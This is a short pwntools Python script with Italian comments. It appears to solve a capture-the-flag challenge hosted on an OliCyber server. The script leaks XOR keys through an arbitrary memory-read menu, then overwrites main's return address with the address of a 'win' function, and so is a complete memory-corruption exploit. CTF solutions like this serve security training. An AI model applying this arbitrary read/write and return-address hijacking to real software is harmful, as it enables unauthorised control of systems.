from pwn import *

r = remote('rwplayground.challs.olicyber.it', 38051)

r.recvline()
main_var = int(r.recvline().decode().strip().split("... ")[1], 16)
main_ret = hex(main_var + 20)

# Mandiamo valore che in memoria vale 0x0000000000000000 così da ottenere read_key
r.sendlineafter(b"> ", b"1")
r.recvline()
r.sendline(b"0x404070")
read_key = int(r.recvline().decode().strip().split(" ")[1], 16)

# Mandiamo l'indirizzo di write_key e quello che riceviamo lo xoriamo con read_key, così da ottenere il valore di write_key
r.sendlineafter(b"> ", b"1")
r.recvline()
r.sendline(b"0x4040b8")
write_key = int(r.recvline().decode().strip().split(" ")[1], 16) ^ read_key

# Impostiamo i return address del main alla funzione win
win_addr = int("0x401397", 16) ^ write_key

r.sendlineafter(b"> ", b"2")
r.recvline()
r.sendline(main_ret.encode())
r.recvline()
r.sendline(hex(win_addr).encode())

r.sendlineafter(b"> ", b"4")

r.interactive()